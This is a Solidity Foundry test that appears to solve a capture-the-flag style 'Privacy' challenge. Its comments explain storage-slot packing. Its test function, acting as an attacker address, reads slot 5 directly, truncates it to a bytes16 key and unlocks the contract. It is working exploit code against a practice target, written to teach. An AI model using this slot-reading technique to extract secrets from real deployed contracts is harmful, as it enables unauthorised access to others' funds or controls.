// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Privacy} from "../src/Privacy.sol";

contract PrivacyTest is Test {
    /*
     * 1. Each storage slot in Ethereum is 32 bytes (256 bits).
     * 2. Solidity tries to pack multiple smaller variables into a single 32-byte slot, if it can.
     * 3. This saves gas, but makes exploitation possible when people forget it.
     * 4. Solidity packs variables in the order they are declared, and only packs values that are:
         * i. smaller than 32 bytes
         * ii. contiguous in declaration
         * iii. same storage location visibility rules
     * 8. If something doesn’t fit → Solidity starts a new storage slot.
    */
    /*
     * bool public locked;                // slot 0
     * uint256 public ID;                 // slot 1
     * uint8 private flattening;          // |
     * uint8 private denomination;        // | slot 2 (packed)
     * uint16 private awkwardness;        // |
     * bytes32[3] private data;           // slot 3,4,5 respectively
    */

    Privacy public privacyTest;
    address public attacker = address(0xBEEF);

    function setUp() public {
        bytes32[3] memory data = [
            bytes32("a"),
            bytes32("b"),
            bytes32("c")
        ];
        privacyTest = new Privacy(data);
    }

    function testPrivacyAttack() public {
        vm.startPrank(attacker);

        // Load storage slot 5 (data[2])
        bytes32 slot = vm.load(address(privacyTest), bytes32(uint256(5)));
        // Take first 16 bytes
        bytes16 key = bytes16(slot);
        privacyTest.unlock(key);
        assertEq(privacyTest.locked(), false);

        vm.stopPrank();
    }
}